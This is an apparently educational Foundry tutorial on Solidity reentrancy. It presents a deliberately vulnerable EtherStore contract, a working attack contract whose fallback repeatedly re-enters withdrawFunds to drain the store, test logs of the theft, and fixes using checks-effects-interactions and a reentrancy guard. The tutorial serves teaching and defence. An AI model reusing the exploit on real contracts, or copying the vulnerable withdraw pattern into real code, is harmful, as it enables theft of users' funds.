# Foundry 5 

version: _pragma solidity ^0.7.6;_

import: _import “forge-std/Test.sol”;_

# EtherStore

``` text copy
contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}
```

# ContractTest

``` text copy
contract ContractTest is Test {
    EtherStore store;
    EtherStoreAttack attack;
    
    function setUp() public {
        store = new EtherStore();
        attack = new EtherStoreAttack(address(store));
        vm.deal(address(store), 2 ether);
        vm.deal(address(attack), 1 ether);
    }

    function testReentrancy() public {
        attack.Attack();  // exploit here
    }
}
```

# EtherStoreAttack

``` text copy
contract EtherStoreAttack is DSTest {
    EtherStore store;
    constructor(address _store) public {
        store = EtherStore(_store);
    }
    
    function Attack() public {
        emit log_named_decimal_uint("Start attack, EtherStore balance", address(store).balance, 18);
        emit log_named_decimal_uint("Start attack, Attacker balance:", address(this).balance, 18);
        store.deposit{value: 1 ether}();
        emit log_named_decimal_uint("Deposited 1 Ether, EtherStore balance", address(store).balance, 18);
        emit log_string("==================== Start of attack ====================");
        store.withdrawFunds(1 ether);   // exploit here
        emit log_string("==================== End of attack ====================");
        emit log_named_decimal_uint("End of attack, EtherStore balance:", address(store).balance, 18);
        emit log_named_decimal_uint("End of attack, Attacker balance:", address(this).balance, 18);
    }

    fallback() external payable {
        emit log_named_decimal_uint("EtherStore balance", address(store).balance, 18);
        emit log_named_decimal_uint("Attacker balance", address(this).balance, 18);
        if (address(store).balance >= 1 ether) {
            emit log_string("Reenter");
            store.withdrawFunds(1 ether);   // exploit here
        }
    }
}
```

**In the Terminal**

``` text copy
Logs:
    Start attack, EtherStore balance: 2.000000000000000000
    Deposited 1 Ether, EtherStore balance: 3.00000000000000000
    =================== Start of attack ===================
    EtherStore balance: 2.000000000000000000
    Attacker balance: 1.000000000000000000
    Reenter
    EtherStore balance: 0.000000000000000000
    Attacker balance: 3.000000000000000000
    =================== End of attack ===================
    End of attack, EtherStore balance:: 0.000000000000000000
    End of attsck, Attacker balance:: 3.000000000000000000
```

``` text copy
EtherStore store;
EtherStoreAttack attack;

function setUp() public {
    store = new EtherStore();
    attack = new EtherStoreAttack(address(store));
    vm.deal(address(store), 2 ether);
    vm.deal(address(attack), 1 ether);
}

function Attack() public {
    emit log_named_decimal_uint("Start attack, EtherStore balance", address(store).balance, 18);
    emit log_named_decimal_uint("Start attack, Attacker balance:", address(this).balance, 18);
    store.deposit{value: 1 ether}();
    emit log_named_decimal_uint("Deposited 1 Ether, EtherStore balance", address(store).balance, 
    18);
    emit log_string("==================== Start of attack ====================");
    store.withdrawFunds(1 ether);   // exploit here
    emit log_string("==================== End of attack ====================");
    emit log_named_decimal_uint("End of attack, EtherStore balance:", address(store).balance, 18);
    emit log_named_decimal_uint("End of attack, Attacker balance:", address(this).balance, 18);
}
```

# HOW!

- Attacker needs to **deposit** because **withdraw function** requires this _balances[msg.sender] >=_
_weiToWithdraw

- Attacker withdraws his money with the following function

``` text copy
function withdrawFunds(uint256 _weiToWithdraw) public {
    require(balances[msg.sender] >= _weiToWithdraw);
    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
    require(send, "send failed");
    balances[msg.sender] -= _weiToWithdraw;
}
```

Yes he can withdraw his money also this part redirects to fallback function

``` text copy
(bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
```

because this function needs to have msg.data in the (“”)

You can see fallback function takes the all the money

``` text copy
if (address(store).balance >= 1 ether) {
    emit log_string("Reenter");
    store.withdrawFunds(1 ether);   // exploit here
}
```

# SOLUTIONS
- Checks Effects Interactions

``` text copy
function withdrawFunds(uint256 _weiToWithdraw) public {
    require(balances[msg.sender] >= _weiToWithdraw);
    balances[msg.sender] -= _weiToWithdraw;
    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
    require(send, "send failed");
}
```

- Use ReentrancyGuard

``` text copy
bool locked; // create this boolen variable

// create this modifier
modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

// add this modifier to withdrawFunds
function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
```